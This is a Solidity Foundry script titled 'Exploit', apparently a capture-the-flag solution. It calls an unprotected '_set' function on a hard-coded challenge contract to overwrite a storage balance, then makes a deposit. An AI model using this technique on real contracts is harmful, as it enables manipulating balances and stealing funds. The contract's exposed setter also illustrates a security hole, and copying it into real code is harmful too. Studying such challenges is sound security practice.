// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IChallenge {
    function balances(uint256) external returns (uint256);
    function deposit(string memory) external payable;
    function _set(uint256, uint256) external;
}

contract Exploit is Script {
    function run() public {
        vm.startBroadcast();
        address challengeAddress = 0xE445ac8365cB798AA9BDA3b478394291e64E7585;
        IChallenge(challengeAddress)._set(uint256(uint160(address(this))), 0);
        IChallenge(challengeAddress).deposit{value: 0.001 ether}("c69bcf6ee7f3820798cafce387240477");
        vm.stopBroadcast();
    }
}
